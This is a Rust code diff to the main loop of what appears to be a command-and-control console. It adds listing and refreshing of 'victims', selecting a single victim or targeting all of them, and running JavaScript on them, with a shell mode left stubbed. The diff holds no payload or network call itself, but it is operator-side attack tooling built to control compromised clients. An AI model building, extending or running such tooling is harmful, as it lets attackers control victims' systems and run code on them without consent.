@@ -16,6 +16,7 @@
  */
 use std::error::Error;
 use std::io::stdout;
+use std::io::Write;
 
 use clap::Clap;
 
@@ -30,24 +31,48 @@ async fn main() -> Result<(), Box<dyn Error>> {
 
     let mut input = String::new();
     s.welcome()?;
-
+    s.refresh_victims().await?;
+    s.list_victims()?;
     loop {
+        s.mode.clone().print_and_read(&mut s, &mut input)?;
+        let _ = Commands::read_and_parse(&mut s, &mut input)?;
         match s.mode {
             Mode::Default => {
-                s.mode.clone().print_and_read(&mut s, &mut input)?;
+                s.list_victims()?;
+
                 let cmd = Commands::read_and_parse(&mut s, &mut input)?;
                 if cmd == Commands::SelectVictim {
-                    s.refresh_victims().await?;
                     s.select_victim(&mut input)?;
                     s.mode.clone().print_and_read(&mut s, &mut input)?;
                     let cmd = Commands::read_and_parse(&mut s, &mut input)?;
                     if cmd == Commands::JavaScript {
                         javascript(&mut s).await?;
                     }
+                } else if cmd == Commands::MultipleVictims {
+                    s.refresh_victims().await?;
+                    write!(s.write, "Targetting all victims")?;
+                    s.write.flush()?;
+                    let cmd = Commands::read_and_parse(&mut s, &mut input)?;
+                    if cmd == Commands::JavaScript {
+                        javascript(&mut s).await?;
+                    } else if cmd == Commands::Shell {
+                    }
                 }
             }
             Mode::Shell => s.shell_prompt()?,
-            Mode::TargetAll => s.targetall_prompt()?,
+            Mode::TargetAll => loop {
+                s.refresh_victims().await?;
+                writeln!(s.write, "Targetting all victims")?;
+                let cmd = Commands::read_and_parse(&mut s, &mut input)?;
+                if cmd == Commands::JavaScript {
+                    javascript(&mut s).await?;
+                } else if cmd == Commands::Shell {
+                    unimplemented!()
+                }
+                if s.mode == Mode::Exit {
+                    break;
+                }
+            },
             Mode::Exit => {
                 println!("Bye!");
                 break;
